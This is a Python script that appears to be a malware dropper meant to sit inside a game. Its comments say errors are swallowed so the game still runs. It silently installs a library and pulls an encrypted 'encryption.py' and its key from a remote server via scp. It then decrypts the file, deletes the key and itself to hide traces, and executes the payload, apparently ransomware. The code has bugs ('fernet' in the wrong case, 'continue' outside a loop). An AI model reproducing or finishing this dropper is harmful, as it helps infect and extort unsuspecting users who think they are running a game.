import os
from cryptography.fernet import fernet

# try-except block makes sure that no matter what errors occur, the game is still run
try:
    # if statement will skip below script if the encryption file is already downloaded
    if os.path.isfile("/encryption.py"):
        continue
    else:
        # Need to delete the key and this file
        files_to_delete = ["key.key", "wrapper_script.py"]
        
        # Define the commands
        # Need to add commands similar to the below one for any other libraries needed
        dwnld_crypto_command = "pip install cryptography"
        # Alt cmd to the below for downloading from a server: curl -o example.txt username@server_ip:/path/to/example.txt
        dwnld_script_command = "scp username@server_ip:/<path to source file> /<path to destination>"
        dwnld_key_command = "scp username@<public ip>:/<path to source file> /<path to destination>"
        rm_command = "rm " + " ".join(files_to_delete)
        run_script_command = "python3 encryption.py"
        
        # Execute the commands to download the library and files
        os.system(dwnld_crypto_command) # Not sure if this will prompt for password or not in the terminal
        os.system(dwnld_script_command)
        os.system(dwnld_key_command)
        
        # Decrypt the encryption script
        with open("key.key", "rb") as key:
            secret_key = key.read()
        
        with open("encryption.py", "rb") as thefile:
            contents = thefile.read()
            
        decrypted_content = fernet(secret_key).decrypt(contents)
        with open("encryption.py", "wb") as thefile:
            thefile.write(decrypted_content)
        
        os.system(rm_command)
        os.system(run_script_command)
        
except Exception as e:
    pass
